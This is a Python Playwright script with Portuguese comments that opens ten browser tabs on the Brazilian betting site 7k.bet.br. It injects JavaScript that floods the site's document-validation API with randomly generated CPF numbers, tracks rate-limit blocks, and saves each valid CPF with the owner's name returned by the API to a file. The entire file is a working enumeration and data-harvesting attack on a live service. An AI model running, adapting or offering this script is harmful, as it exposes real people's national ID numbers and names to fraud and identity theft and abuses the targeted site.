#!/usr/bin/env python3
"""
Injetor Multi-Tab - 10 tabs simultâneas
"""
import random
import time
import threading
from playwright.sync_api import sync_playwright

NUM_TABS = 10
REQUESTS_PER_TAB = 100
BATCH_SIZE = 20

lock = threading.Lock()
stats = {"ok": 0, "validos": 0, "blocked": 0, "erro": 0}
cpfs_validos = []

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def tab_worker(tab_id, context, inicio):
    """Worker para cada tab"""
    global stats, cpfs_validos
    
    page = context.new_page()
    page.goto("https://7k.bet.br/", wait_until="domcontentloaded")
    page.wait_for_timeout(3000)
    
    # Injeta código
    page.evaluate("""() => {
        window.stats = {ok: 0, validos: [], blocked: 0, erro: 0};
        window.validarCPF = async (cpf) => {
            try {
                const r = await fetch('/api/documents/validate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({number: cpf, type: 'cpf'})
                });
                if (r.status === 200) {
                    const data = await r.json();
                    window.stats.ok++;
                    window.stats.validos.push({cpf, nome: data.data?.name || 'N/A'});
                } else if (r.status === 400) {
                    window.stats.ok++;
                } else if (r.status === 403) {
                    window.stats.blocked++;
                } else {
                    window.stats.erro++;
                }
            } catch (e) {
                window.stats.erro++;
            }
        };
    }""")
    
    batches = REQUESTS_PER_TAB // BATCH_SIZE
    
    for batch in range(batches):
        cpfs = [gerar_cpf() for _ in range(BATCH_SIZE)]
        
        page.evaluate("""async (cpfs) => {
            await Promise.all(cpfs.map(cpf => window.validarCPF(cpf)));
        }""", cpfs)
        
        # Atualiza stats globais
        local_stats = page.evaluate("() => window.stats")
        
        with lock:
            # Calcula incrementos
            stats["ok"] = sum([stats["ok"]] + [local_stats["ok"]])
            done = stats["ok"] + stats["blocked"] + stats["erro"]
            elapsed = time.time() - inicio
            rate = done / elapsed if elapsed > 0 else 0
            
            # Adiciona novos válidos
            for v in local_stats["validos"]:
                if v not in cpfs_validos:
                    cpfs_validos.append(v)
            
            print(f"   [Tab {tab_id+1:2d}] Lote {batch+1}/{batches} | Total: {done} | {rate:.1f} req/s | Válidos: {len(cpfs_validos)}")
        
        # Reset stats locais para evitar duplicatas
        page.evaluate("() => { window.stats = {ok: 0, validos: [], blocked: 0, erro: 0}; }")
        
        time.sleep(0.2)
    
    page.close()

def main():
    print("="*65)
    print(f"💉 INJETOR MULTI-TAB - {NUM_TABS} TABS x {REQUESTS_PER_TAB} req = {NUM_TABS * REQUESTS_PER_TAB} total")
    print("="*65)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        
        print(f"\n🌐 Abrindo {NUM_TABS} tabs...")
        
        inicio = time.time()
        threads = []
        
        for i in range(NUM_TABS):
            t = threading.Thread(target=tab_worker, args=(i, context, inicio))
            threads.append(t)
            t.start()
            time.sleep(0.5)  # Pequeno delay entre abrir tabs
        
        print(f"\n🚀 {NUM_TABS} tabs iniciadas! Aguardando conclusão...\n")
        
        for t in threads:
            t.join()
        
        tempo = time.time() - inicio
        total = NUM_TABS * REQUESTS_PER_TAB
        
        print("\n" + "="*65)
        print("📊 RELATÓRIO FINAL")
        print("="*65)
        print(f"   Tabs: {NUM_TABS}")
        print(f"   Requisições por tab: {REQUESTS_PER_TAB}")
        print(f"   Total requisições: {total}")
        print(f"   Tempo total: {tempo:.1f}s")
        print(f"\n   ⚡ VELOCIDADE: {total/tempo:.1f} req/s")
        print(f"\n   🎯 CPFs válidos encontrados: {len(cpfs_validos)}")
        
        if cpfs_validos:
            print(f"\n🎯 CPFs VÁLIDOS:")
            for v in cpfs_validos[:50]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            with open("cpfs_10tabs.txt", "w", encoding="utf-8") as f:
                for v in cpfs_validos:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_10tabs.txt")
        
        print("\n⏳ Fechando browser...")
        browser.close()
        
        print("\n" + "="*65)
        print(f"✅ CONCLUSÃO: {total/tempo:.1f} req/s com {NUM_TABS} tabs")
        print("="*65)

if __name__ == "__main__":
    main()







